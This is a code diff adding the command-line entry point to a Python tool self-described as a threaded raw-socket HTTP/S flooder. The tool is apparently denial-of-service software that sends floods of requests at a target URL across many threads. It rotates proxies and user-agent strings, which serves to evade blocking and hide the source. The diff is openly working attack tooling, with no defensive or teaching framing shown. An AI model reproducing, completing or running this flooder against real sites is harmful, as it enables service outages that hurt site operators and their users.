@@ -1,4 +1,3 @@
-import os
 import threading
 import random
 import sys
@@ -437,4 +436,75 @@ class ThreadedFlooder:
         print(f"Connection Errors:   {final_conn_err}")
         print(f"Requests Per Second: {rps:.2f} (Average)")
         print(f"Total Data Sent:     {mb_sent:.2f} MB")
-        print(f"Avg. Bandwidth Sent: 
+        print(f"Avg. Bandwidth Sent: {mbps:.2f} Mbps")
+        print("="*58)
+
+def main():
+    global CONNECT_TIMEOUT, READ_WRITE_TIMEOUT, REQUESTS_PER_CONNECTION, STATS_INTERVAL, INTER_REQUEST_SLEEP, FAIL_SLEEP
+    parser = argparse.ArgumentParser(
+        description='Threaded Raw Socket HTTP/S Flooder - Optimized',
+        formatter_class=argparse.ArgumentDefaultsHelpFormatter
+    )
+    parser.add_argument('url', type=str, help='Target URL (e.g., https://example.com)')
+    parser.add_argument('workers', type=int, help='Number of concurrent worker threads')
+    parser.add_argument('http_method', type=str, choices=['get', 'post'], help='HTTP method')
+    parser.add_argument('--proxy-type', type=str, default='direct',
+                        choices=['http', 'https', 'socks4', 'socks5', 'direct'], help='Proxy type')
+    parser.add_argument('--proxy-file', type=str, default=None,
+                        help='File containing proxies (host:port). Required if --proxy-type is not direct.')
+    parser.add_argument('--user-agents', type=str, default=DEFAULT_USER_AGENTS_FILE,
+                        help='File containing User-Agent strings')
+    parser.add_argument('--connect-timeout', type=int, default=CONNECT_TIMEOUT,
+                        help='Connection establishment timeout (seconds)')
+    parser.add_argument('--rw-timeout', type=int, default=READ_WRITE_TIMEOUT,
+                        help='Socket read/write operations timeout (seconds)')
+    parser.add_argument('--reqs-per-conn', type=int, default=REQUESTS_PER_CONNECTION,
+                        help='Max requests per keep-alive connection')
+    parser.add_argument('--stats-interval', type=int, default=STATS_INTERVAL,
+                        help='Interval for printing stats (seconds)')
+    parser.add_argument('--inter-request-sleep', type=float, default=INTER_REQUEST_SLEEP,
+                        help='Sleep time between requests on same connection (seconds, 0 to yield only)')
+    parser.add_argument('--fail-sleep', type=float, default=FAIL_SLEEP,
+                        help='Sleep time after a connection failure (seconds)')
+    args = parser.parse_args()
+
+    CONNECT_TIMEOUT = args.connect_timeout
+    READ_WRITE_TIMEOUT = args.rw_timeout
+    REQUESTS_PER_CONNECTION = args.reqs_per_conn
+    STATS_INTERVAL = args.stats_interval
+    INTER_REQUEST_SLEEP = args.inter_request_sleep
+    FAIL_SLEEP = args.fail_sleep
+
+    if args.proxy_type != 'direct' and not args.proxy_file:
+        print("Error: --proxy-file is required when --proxy-type is not 'direct'", file=sys.stderr)
+        sys.exit(1)
+    if args.proxy_type == 'direct' and args.proxy_file:
+        print("Warning: --proxy-file specified but --proxy-type is 'direct'. File ignored.", file=sys.stderr)
+        args.proxy_file = None
+
+    try:
+        resource_manager = ResourceManager(user_agents_file=args.user_agents)
+        proxy_manager = ThreadGroupProxyManager(proxy_type=args.proxy_type, proxy_file=args.proxy_file)
+        flooder = ThreadedFlooder(
+            target_url=args.url,
+            num_workers=args.workers,
+            http_method=args.http_method,
+            proxy_manager=proxy_manager,
+            resource_manager=resource_manager
+        )
+    except Exception as e:
+        logger.error(f"Initialization failed: {e}", exc_info=True)
+        sys.exit(1)
+
+    flooder.start()
+
+if __name__ == '__main__':
+    import os
+    if not os.path.exists('default'): os.makedirs('default', exist_ok=True)
+    ua_path = 'default/useragents.txt'
+    if not os.path.exists(ua_path):
+        print(f"Creating dummy user agent file: {ua_path}")
+        with open(ua_path, 'w') as f:
+            f.write("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\n")
+            f.write("Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1\n")
+    main()
